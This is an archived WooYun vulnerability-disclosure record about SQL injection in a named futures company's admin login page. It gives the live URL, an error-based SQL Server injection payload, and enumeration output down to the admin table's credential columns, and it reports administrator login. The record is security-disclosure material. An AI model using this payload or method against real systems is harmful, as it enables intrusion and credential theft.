{"id": 82099, "wybug_id": "wooyun-2015-0152075", "wybug_title": "通惠期货后台登录处存在SQL注入漏洞", "wybug_corp": "通惠期货有限公司", "wybug_author": "Nelion", "wybug_date": "2015-11-05 17:56", "wybug_open_date": "2015-12-20 17:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-12-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  在后台登录窗口（http://www.tlqh.com.cn/manager/Login.aspx）处用burp抓一下包,保存一下放入sql里面跑。   漏洞证明：  1、看一下都有哪些数据库：\nParameter: txtname (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwUKLTUwOTQ0NDQ3MWRkG4evLtrTgC3zhxkpHqYKHwmg4AA=&__VIEWSTATEGENERATOR=6942E586&__EVENTVALIDATION=/wEWBAL1uKqqAgLEhISACwKd+7q4BwKp8pn0BZ2S3vC+NXfN7AJV6RSr9xcmsIso&txtname=admin' AND 3221=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(113)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (3221=3221) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(112)+CHAR(106)+CHAR(113)))-- SziJ&txtpwd=123456&tijiao=-----------web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008\n\navailable databases [7]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] tonglianQH\n2、当前库是tonglianQH,看一下该库中的表：\nDatabase: tonglianQH[20 tables]+------------------+| B_Admin          || B_Keyword        || B_PageMenu       || B_PagePower      || B_RolePower      || B_RolePower      || B_SEOInfo        || ShaoMiaoType     || Web_AboutMenu    || Web_Case         || Web_CaseType     || Web_IndexImg     || Web_Job          || Web_MenuPage     || Web_Message      || Web_News         || Web_NewsType     || Web_ShaoMiaoCase || Web_YRZZImg      || web_link         |+------------------+\n3、再看一下这个B_Admin表中的字段：\nDatabase: tonglianQHTable: B_Admin[11 columns]+---------------+----------+| Column        | Type     |+---------------+----------+| AID           | int      || CDate         | datetime || ISDelete      | int      || ISLock        | int      || LastLoginDate | datetime || LastLoginIP   | varchar  || LoginName     | varchar  || LoginTime     | int      || Name          | varchar  || Password      | varchar  || RID           | int      |+---------------+----------+\n4、看一下Name,LoginName，Password字段的内容：（还是截个图吧，不然我不好打码~~~）\n\n5、顺便提一下，数据库用户是sa，权限挺高的：\n\n6、用这信息在后台登录一下管理员用户：（后台：http://www.tlqh.com.cn/manager/Login.aspx）\n\n   修复方案：  过滤一下参数；而且后台的密码也挺弱的。   版权声明：转载请注明来源 Nelion@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}